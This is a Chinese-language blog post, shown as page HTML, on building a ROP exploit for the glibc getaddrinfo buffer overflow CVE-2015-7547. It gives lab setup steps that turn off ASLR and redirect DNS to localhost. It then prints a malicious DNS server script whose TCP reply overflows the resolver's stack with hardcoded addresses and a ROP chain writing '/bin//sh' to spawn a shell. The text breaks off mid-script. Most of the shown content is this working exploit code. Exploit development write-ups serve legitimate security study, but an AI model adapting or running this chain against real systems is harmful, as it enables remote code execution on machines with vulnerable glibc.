<!DOCTYPE html>


  <html class="light page-post">


<head>
  <meta charset="utf-8">
  
  <title>Linux glibc 缓冲区溢出漏洞(CVE-2015-7547) shellcode 编写 | Star</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="缓冲区溢出,ROP,CVE,exploit 编写," />
  

  <meta name="description" content="经过一个星期的艰苦奋斗，Linux glibc 缓冲区溢出漏洞(CVE-2015-7547) POC 终于出炉了！！！！漏洞分析请参考 Linux glibc 缓冲区溢出漏洞分析(CVE-2015-7547) 分析可是我把 ASLR 关了，不算太完美，希望以后继续奋斗。如果有大神弄出来了，一起学习学习，我的邮箱 huirong_star@163.com">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux glibc 缓冲区溢出漏洞(CVE-2015-7547) shellcode 编写">
<meta property="og:url" content="https://huirong.github.io/2016/04/25/Linux-glibc-stackOverflow-CVE-2015-7547/index.html">
<meta property="og:site_name" content="Star">
<meta property="og:description" content="经过一个星期的艰苦奋斗，Linux glibc 缓冲区溢出漏洞(CVE-2015-7547) POC 终于出炉了！！！！漏洞分析请参考 Linux glibc 缓冲区溢出漏洞分析(CVE-2015-7547) 分析可是我把 ASLR 关了，不算太完美，希望以后继续奋斗。如果有大神弄出来了，一起学习学习，我的邮箱 huirong_star@163.com">
<meta property="og:image" content="https://ww3.sinaimg.cn/large/005CA6ZCgw1f39vfmsmo1j30hj03xmy2.jpg">
<meta property="og:image" content="https://ww3.sinaimg.cn/large/005CA6ZCgw1f3b2alqd3bj30bx07s0su.jpg">
<meta property="og:image" content="https://ww1.sinaimg.cn/large/005CA6ZCgw1f39wyn3kqij30hm06f0t4.jpg">
<meta property="og:image" content="https://ww4.sinaimg.cn/large/005CA6ZCgw1f39x0dgwgjj30hh023aaz.jpg">
<meta property="og:image" content="https://ww2.sinaimg.cn/large/005CA6ZCgw1f3b2cvqpndj30bz07s3ym.jpg">
<meta property="og:image" content="https://ww2.sinaimg.cn/large/005CA6ZCgw1f3b2godjbtj30au03974l.jpg">
<meta property="og:image" content="https://ww3.sinaimg.cn/large/005CA6ZCgw1f39xlu5c2hj30k3037dha.jpg">
<meta property="og:image" content="https://ww2.sinaimg.cn/large/005CA6ZCgw1f39xv4sosrj30i901ut8x.jpg">
<meta property="og:image" content="https://ww3.sinaimg.cn/large/005CA6ZCgw1f3a2o1rmupj30ae03vjrt.jpg">
<meta property="og:image" content="https://ww2.sinaimg.cn/large/005CA6ZCgw1f39xwf33z9j30kr026q3m.jpg">
<meta property="og:image" content="https://ww4.sinaimg.cn/large/005CA6ZCgw1f39yflxqmej30j407pjvk.jpg">
<meta property="og:image" content="https://ww4.sinaimg.cn/large/005CA6ZCgw1f3b2nfiafbj30bx09fglu.jpg">
<meta property="og:image" content="https://ww3.sinaimg.cn/large/005CA6ZCgw1f3b2yu35evj30k60c2q5y.jpg">
<meta property="og:image" content="https://ww4.sinaimg.cn/large/005CA6ZCgw1f3adu9z86vj30k70butas.jpg">
<meta property="og:image" content="https://ww4.sinaimg.cn/large/005CA6ZCgw1f3aedzhbl4j30k60cfwgl.jpg">
<meta property="og:image" content="https://ww1.sinaimg.cn/large/005CA6ZCgw1f3aeg17c9pj30iu0bon40.jpg">
<meta property="og:image" content="https://ww1.sinaimg.cn/large/005CA6ZCgw1f3aehnc8roj30gj08fwg5.jpg">
<meta property="og:image" content="https://ww3.sinaimg.cn/large/005CA6ZCgw1f3aetbguv3j30c60cpwev.jpg">
<meta property="og:image" content="https://ww3.sinaimg.cn/large/005CA6ZCgw1f3aewyyvd3j30k30bh0x9.jpg">
<meta property="og:image" content="https://ww3.sinaimg.cn/large/005CA6ZCgw1f3af7s7jskj30k20bjdh9.jpg">
<meta property="og:image" content="https://ww4.sinaimg.cn/large/005CA6ZCgw1f3afbx7cugj30jp0d9gnj.jpg">
<meta property="og:image" content="https://ww2.sinaimg.cn/large/005CA6ZCgw1f3afhx6l76j30k40c6abh.jpg">
<meta property="og:image" content="https://ww2.sinaimg.cn/large/005CA6ZCgw1f3ag18pvkej30k80cgjtd.jpg">
<meta property="og:image" content="https://ww2.sinaimg.cn/large/005CA6ZCgw1f3ag51ewr1j30lk067jub.jpg">
<meta property="og:image" content="https://ww2.sinaimg.cn/large/005CA6ZCgw1f3age6gv2yj30ka05qgns.jpg">
<meta property="og:image" content="https://ww4.sinaimg.cn/large/005CA6ZCgw1f3ages1p9sj30kt0eq43z.jpg">
<meta property="og:image" content="https://ww3.sinaimg.cn/large/005CA6ZCgw1f3agh9snsxj30c60g70td.jpg">
<meta property="og:image" content="https://ww4.sinaimg.cn/large/005CA6ZCgw1f3b3jk046bj30c70g7q3k.jpg">
<meta property="og:image" content="https://ww3.sinaimg.cn/large/005CA6ZCgw1f3agojiur4j30f502o754.jpg">
<meta property="og:updated_time" content="2017-02-19T10:37:22.516Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Linux glibc 缓冲区溢出漏洞(CVE-2015-7547) shellcode 编写">
<meta name="twitter:description" content="经过一个星期的艰苦奋斗，Linux glibc 缓冲区溢出漏洞(CVE-2015-7547) POC 终于出炉了！！！！漏洞分析请参考 Linux glibc 缓冲区溢出漏洞分析(CVE-2015-7547) 分析可是我把 ASLR 关了，不算太完美，希望以后继续奋斗。如果有大神弄出来了，一起学习学习，我的邮箱 huirong_star@163.com">
<meta name="twitter:image" content="https://ww3.sinaimg.cn/large/005CA6ZCgw1f39vfmsmo1j30hj03xmy2.jpg">

  

  
    <link rel="icon" href="/favicon.ico">
  

  <link href="/css/styles.css?v=028c63b1" rel="stylesheet">


  
    <link rel="stylesheet" href="/css/huirong.css">
  

  

  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?13fd5daa6d82a4022fb7211641792382";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body>


  
    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
  

  <div class="post-header CENTER">
   
  <div class="toolbox">
    <a class="toolbox-entry" href="/">
      <span class="toolbox-entry-text">盒子</span>
      <i class="icon-angle-down"></i>
      <i class="icon-home"></i>
    </a>
    <ul class="list-toolbox">
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/archives/"
            target="_self"
            >
            博客
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/category/"
            target="_self"
            >
            分类
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/tag/"
            target="_self"
            >
            标签
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/link/"
            target="_self"
            >
            友链
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/about/"
            target="_self"
            >
            关于
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/search/"
            target="_self"
            >
            搜索
          </a>
        </li>
      
    </ul>
  </div>


</div>


  <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅰ、实验环境"><span class="toc-text">Ⅰ、实验环境</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-操作系统和-glibc-版本"><span class="toc-text">① 操作系统和 glibc 版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-准备工作"><span class="toc-text">② 准备工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#③-POC"><span class="toc-text">③ POC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅱ、栈布局"><span class="toc-text">Ⅱ、栈布局</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-gdb-调试下栈布局"><span class="toc-text">① gdb 调试下栈布局</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-运行过程中，实际栈布局"><span class="toc-text">② 运行过程中，实际栈布局</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅲ、非零校验"><span class="toc-text">Ⅲ、非零校验</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅳ、free-指针处理"><span class="toc-text">Ⅳ、free 指针处理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅴ、构造-shellcode"><span class="toc-text">Ⅴ、构造 shellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅵ、调整-parameter"><span class="toc-text">Ⅵ、调整 parameter</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-查看参数地址"><span class="toc-text">① 查看参数地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-绘制整体栈布局"><span class="toc-text">② 绘制整体栈布局</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-gdb-中栈布局"><span class="toc-text">(1) gdb 中栈布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-实际运行时-栈布局"><span class="toc-text">(2)实际运行时 栈布局</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅶ、调整返回地址"><span class="toc-text">Ⅶ、调整返回地址</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ⅷ、参考文献"><span class="toc-text">Ⅷ、参考文献</span></a></li></ol>
  </div>



<div class="content content-post CENTER">
   <article id="post-Linux-glibc-stackOverflow-CVE-2015-7547" class="article article-type-post" itemprop="blogPost">
  <header class="article-header">
    <h1 class="post-title">Linux glibc 缓冲区溢出漏洞(CVE-2015-7547) shellcode 编写</h1>

    <div class="article-meta">
      <span>
        <i class="icon-calendar"></i>
        <span>2016.04.25</span>
      </span>

      
        <span class="article-author">
          <i class="icon-user"></i>
          <span>star</span>
        </span>
      

      
  <span class="article-category">
    <i class="icon-list"></i>
    <a class="article-category-link" href="/categories/CVE/">CVE</a>
  </span>



      

    </div>
  </header>

  <div class="article-content">
    
      <p>经过一个星期的艰苦奋斗，Linux glibc 缓冲区溢出漏洞(CVE-2015-7547) POC 终于出炉了！！！！<br>漏洞分析请参考 <a href="http://huirong.github.io/2016/04/12/Linux-glibc-stackOverflow-CVE-2015-7547-analysis/">Linux glibc 缓冲区溢出漏洞分析(CVE-2015-7547) 分析</a><br>可是我把 ASLR 关了，不算太完美，希望以后继续奋斗。如果有大神弄出来了，一起学习学习，我的邮箱 huirong_star@163.com<br><a id="more"></a></p>
<h1 id="Ⅰ、实验环境"><a href="#Ⅰ、实验环境" class="headerlink" title="Ⅰ、实验环境"></a>Ⅰ、实验环境</h1><h2 id="①-操作系统和-glibc-版本"><a href="#①-操作系统和-glibc-版本" class="headerlink" title="① 操作系统和 glibc 版本"></a>① 操作系统和 glibc 版本</h2><ul>
<li>操作系统：Ubuntu 15.04</li>
<li>调试器：GDB</li>
<li>glibc版本：glibc2.20</li>
</ul>
<h2 id="②-准备工作"><a href="#②-准备工作" class="headerlink" title="② 准备工作"></a>② 准备工作</h2><ol>
<li><p>关闭 ASLR</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo su</div><div class="line"><span class="built_in">echo</span> 0 &gt; proc/sys/kernel/randomize_va_space</div><div class="line"><span class="built_in">exit</span></div></pre></td></tr></table></figure>
<p><img src="https://ww3.sinaimg.cn/large/005CA6ZCgw1f39vfmsmo1j30hj03xmy2.jpg" alt=""></p>
</li>
<li><p>设置core dump文件生成</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">ulimit</span> -c 1024</div></pre></td></tr></table></figure>
<p><font color="red">Tips：</font>此设置方法只对当前终端有效，如果在另一终端运行程序，需重新设置一次。</p>
</li>
<li>配置本地 DNS 服务器<br>运行poc的python服务器之前，修改/etc/resolv.conf配置，将域名服务器改为127.0.0.1，本机器会无法正常访问网页。<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">nameserver</span> 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span></div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="③-POC"><a href="#③-POC" class="headerlink" title="③ POC"></a>③ POC</h2><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/usr/bin/python</span></div><div class="line"><span class="meta">#</span></div><div class="line"><span class="meta"># Copyright 2016 Google Inc</span></div><div class="line"><span class="meta">#</span></div><div class="line"><span class="meta"># Licensed under the Apache License, Version 2.0 (the "License");</span></div><div class="line"><span class="meta"># you may not use this file except in compliance with the License.</span></div><div class="line"><span class="meta"># You may obtain a copy of the License at</span></div><div class="line"><span class="meta">#</span></div><div class="line"><span class="meta">#     http://www.apache.org/licenses/LICENSE-2.0</span></div><div class="line"><span class="meta">#</span></div><div class="line"><span class="meta"># Unless required by applicable law or agreed to in writing, software</span></div><div class="line"><span class="meta"># distributed under the License is distributed on an "AS IS" BASIS,</span></div><div class="line"><span class="meta"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></div><div class="line"><span class="meta"># See the License for the specific language governing permissions and</span></div><div class="line"><span class="meta"># limitations under the License.</span></div><div class="line"><span class="meta">#</span></div><div class="line"><span class="meta"># Authors: </span></div><div class="line"><span class="meta">#   Fermin J. Serna &lt;fjserna@google.com&gt;</span></div><div class="line"><span class="meta">#   Gynvael Coldwind &lt;gynvael@google.com&gt;</span></div><div class="line"><span class="meta">#   Thomas Garnier &lt;thgarnie@google.com&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"></div><div class="line"><span class="type">IP</span> = '<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>' # <span class="type">Insert</span> your ip for bind() here...</div><div class="line"><span class="type">ANSWERS1</span> = <span class="number">184</span></div><div class="line"></div><div class="line"><span class="title">terminate</span> = <span class="type">False</span></div><div class="line"><span class="title">last_reply</span> = <span class="type">None</span></div><div class="line"><span class="title">reply_now</span> = threading.<span class="type">Event</span>()</div><div class="line"></div><div class="line"></div><div class="line"><span class="title">def</span> dw(x):</div><div class="line">  return struct.pack('&gt;<span class="type">H'</span>, x)</div><div class="line"></div><div class="line"><span class="title">def</span> dd(x):</div><div class="line">  return struct.pack('&gt;<span class="type">I'</span>, x)</div><div class="line"></div><div class="line"><span class="title">def</span> dl(x):</div><div class="line">  return struct.pack('&lt;<span class="type">Q'</span>, x)</div><div class="line"></div><div class="line"><span class="title">def</span> db(x):</div><div class="line">  return chr(x)</div><div class="line"></div><div class="line"><span class="title">def</span> udp_thread():</div><div class="line">  global terminate</div><div class="line"></div><div class="line">  # <span class="type">Handle</span> <span class="type">UDP</span> requests</div><div class="line">  sock_udp = socket.socket(socket.<span class="type">AF_INET</span>, socket.<span class="type">SOCK_DGRAM</span>)</div><div class="line">  sock_udp.setsockopt(socket.<span class="type">SOL_SOCKET</span>, socket.<span class="type">SO_REUSEADDR</span>, <span class="number">1</span>)</div><div class="line">  sock_udp.bind((<span class="type">IP</span>, <span class="number">53</span>))</div><div class="line"></div><div class="line">  reply_counter = <span class="number">0</span></div><div class="line">  counter = <span class="number">-1</span></div><div class="line"></div><div class="line">  answers = []</div><div class="line"></div><div class="line">  while not terminate:</div><div class="line">    <span class="class"><span class="keyword">data</span>, addr = sock_udp.recvfrom(1024)</span></div><div class="line">    print '[<span class="type">UDP</span>] <span class="type">Total</span> <span class="type">Data</span> len recv ' + str(len(<span class="class"><span class="keyword">data</span>))</span></div><div class="line">    id_udp = struct.unpack('&gt;<span class="type">H'</span>, <span class="class"><span class="keyword">data</span>[0:2])[0]</span></div><div class="line">    query_udp = <span class="class"><span class="keyword">data</span>[12:]</span></div><div class="line"></div><div class="line">    # <span class="type">Send</span> truncated flag... so it retries over <span class="type">TCP</span></div><div class="line">    <span class="class"><span class="keyword">data</span> = dw(<span class="title">id_udp</span>)                    # id</span></div><div class="line">    <span class="class"><span class="keyword">data</span> += dw(0<span class="title">x8380</span>)                   # flags with truncated set</span></div><div class="line">    <span class="class"><span class="keyword">data</span> += dw(1)                        # questions</span></div><div class="line">    <span class="class"><span class="keyword">data</span> += dw(0)                        # answers</span></div><div class="line">    <span class="class"><span class="keyword">data</span> += dw(0)                        # authoritative</span></div><div class="line">    <span class="class"><span class="keyword">data</span> += dw(0)                        # additional</span></div><div class="line">    <span class="class"><span class="keyword">data</span> += query_udp                    # question</span></div><div class="line">    <span class="class"><span class="keyword">data</span> += '\x00' * 2500                # <span class="type">Need</span> a long <span class="type">DNS</span> response to force malloc </span></div><div class="line"></div><div class="line">    answers.append((<span class="class"><span class="keyword">data</span>, addr))</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> len(answers) != <span class="number">2</span>:</div><div class="line">      continue</div><div class="line"></div><div class="line">    counter += <span class="number">1</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> counter % <span class="number">4</span> == <span class="number">2</span>:</div><div class="line">      answers = answers[::<span class="number">-1</span>]</div><div class="line"></div><div class="line">    time.sleep(<span class="number">0.01</span>)</div><div class="line">    sock_udp.sendto(*answers.pop(<span class="number">0</span>))</div><div class="line">    reply_now.wait()</div><div class="line">    sock_udp.sendto(*answers.pop(<span class="number">0</span>))</div><div class="line"></div><div class="line">  sock_udp.close()</div><div class="line"></div><div class="line"></div><div class="line"><span class="title">def</span> tcp_thread():</div><div class="line">  global terminate</div><div class="line">  counter = <span class="number">-1</span></div><div class="line"></div><div class="line">  #<span class="type">Open</span> <span class="type">TCP</span> socket</div><div class="line">  sock_tcp = socket.socket(socket.<span class="type">AF_INET</span>, socket.<span class="type">SOCK_STREAM</span>)</div><div class="line">  sock_tcp.setsockopt(socket.<span class="type">SOL_SOCKET</span>, socket.<span class="type">SO_REUSEADDR</span>, <span class="number">1</span>)</div><div class="line">  sock_tcp.bind((<span class="type">IP</span>, <span class="number">53</span>))</div><div class="line">  sock_tcp.listen(<span class="number">10</span>)</div><div class="line"></div><div class="line">  while not terminate:</div><div class="line">    conn, addr = sock_tcp.accept()</div><div class="line">    counter += <span class="number">1</span></div><div class="line">    print '<span class="type">Connected</span> with ' + addr[<span class="number">0</span>] + ':' + str(addr[<span class="number">1</span>])</div><div class="line"></div><div class="line">    # <span class="type">Read</span> entire packet</div><div class="line">    <span class="class"><span class="keyword">data</span> = conn.recv(1024)</span></div><div class="line">    print '[<span class="type">TCP</span>] <span class="type">Total</span> <span class="type">Data</span> len recv ' + str(len(<span class="class"><span class="keyword">data</span>))</span></div><div class="line"></div><div class="line">    reqlen1 = socket.ntohs(struct.unpack('<span class="type">H'</span>, <span class="class"><span class="keyword">data</span>[0:2])[0])</span></div><div class="line">    print '[<span class="type">TCP</span>] <span class="type">Request1</span> len recv ' + str(reqlen1)</div><div class="line">    data1 = <span class="class"><span class="keyword">data</span>[2:2+reqlen1]</span></div><div class="line">    id1 = struct.unpack('&gt;<span class="type">H'</span>, data1[<span class="number">0</span>:<span class="number">2</span>])[<span class="number">0</span>]</div><div class="line">    query1 = <span class="class"><span class="keyword">data</span>[12:]</span></div><div class="line"></div><div class="line">    # <span class="type">Do</span> we have an extra request?</div><div class="line">    data2 = <span class="type">None</span></div><div class="line">    <span class="keyword">if</span> len(<span class="class"><span class="keyword">data</span>) &gt; 2+reqlen1:</span></div><div class="line">      reqlen2 = socket.ntohs(struct.unpack('<span class="type">H'</span>, <span class="class"><span class="keyword">data</span>[2+reqlen1:2+reqlen1+2])[0])</span></div><div class="line">      print '[<span class="type">TCP</span>] <span class="type">Request2</span> len recv ' + str(reqlen2)</div><div class="line">      data2 = <span class="class"><span class="keyword">data</span>[2+reqlen1+2:2+reqlen1+2+reqlen2]</span></div><div class="line">      id2 = struct.unpack('&gt;<span class="type">H'</span>, data2[<span class="number">0</span>:<span class="number">2</span>])[<span class="number">0</span>]</div><div class="line">      query2 = data2[<span class="number">12</span>:]</div><div class="line"></div><div class="line">    # <span class="type">Reply</span> them on different packets</div><div class="line">    <span class="class"><span class="keyword">data</span> = ''</span></div><div class="line">    <span class="class"><span class="keyword">data</span> += dw(<span class="title">id1</span>)                      # id</span></div><div class="line">    <span class="class"><span class="keyword">data</span> += dw(0<span class="title">x8180</span>)                   # flags</span></div><div class="line">    <span class="class"><span class="keyword">data</span> += dw(1)                        # questions</span></div><div class="line">    <span class="class"><span class="keyword">data</span> += dw(<span class="type">ANSWERS1</span>)                 # answers</span></div><div class="line">    <span class="class"><span class="keyword">data</span> += dw(0)                        # authoritative</span></div><div class="line">    <span class="class"><span class="keyword">data</span> += dw(0)                        # additional</span></div><div class="line">    <span class="class"><span class="keyword">data</span> += query1                       # question</span></div><div class="line"></div><div class="line">    for i <span class="keyword">in</span> range(<span class="type">ANSWERS1</span>):</div><div class="line">      answer = dw(<span class="number">0xc00c</span>)  # name compressed</div><div class="line">      answer += dw(<span class="number">1</span>)      # <span class="class"><span class="keyword">type</span> <span class="type">A</span></span></div><div class="line">      answer += dw(<span class="number">1</span>)      # <span class="keyword">class</span></div><div class="line">      answer += dd(<span class="number">13</span>)     # ttl</div><div class="line">      answer += dw(<span class="number">4</span>)      # <span class="class"><span class="keyword">data</span> length</span></div><div class="line">      answer += '<span class="type">D'</span> * <span class="number">4</span>    # <span class="class"><span class="keyword">data</span></span></div><div class="line"></div><div class="line">      <span class="class"><span class="keyword">data</span> += answer</span></div><div class="line"></div><div class="line">    data1_reply = dw(len(<span class="class"><span class="keyword">data</span>)) + <span class="keyword">data</span></span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> data2:</div><div class="line">      <span class="class"><span class="keyword">data</span> = ''</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += dw(<span class="title">id2</span>)</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += '<span class="type">B'</span> * (2106)</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += dw(0)                           # &amp;ans2p_malloced</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += dw(0)</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += '<span class="type">B'</span> * (8)</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">xbfffe1c0</span>)    #host_buffer.buf</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">x0804c3a8</span>)    #host_buffer.buf</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += '<span class="type">B'</span> * (12)</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">xb7fd3000</span>)</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">xb7e23301</span>)</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">x00000420</span>)</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">xbfffef68</span>)</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">xb7e59ef4</span>)    #add esp 0x1c</span></div><div class="line"></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">x08048653</span>)    # &amp;name</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">xbfffeee8</span>)    # &amp;pat</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">xbfffe9f0</span>)    # &amp;buffer</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">x00000420</span>)    # &amp;buflen</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">xbfffeee4</span>)    # &amp;errnop</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">xbfffeed0</span>)    # &amp;herrnop</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">x00000000</span>)    # &amp;ttlp</span></div><div class="line"></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">xb7f183e0</span>)    #pop ecx;pop eax;ret</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += '/bin'</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">x0804a018</span>)   # @ .<span class="keyword">data</span></span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7e5f37f</span>)   # mov [eax] ecx ;;</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7f183e0</span>)   # pop ecx ; pop eax ;;</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += '//sh'              </span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">x0804a01c</span>)   # @ .<span class="keyword">data</span> + 4</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7e5f37f</span>)   # mov [eax] ecx ;;</span></div><div class="line">      <span class="class"><span 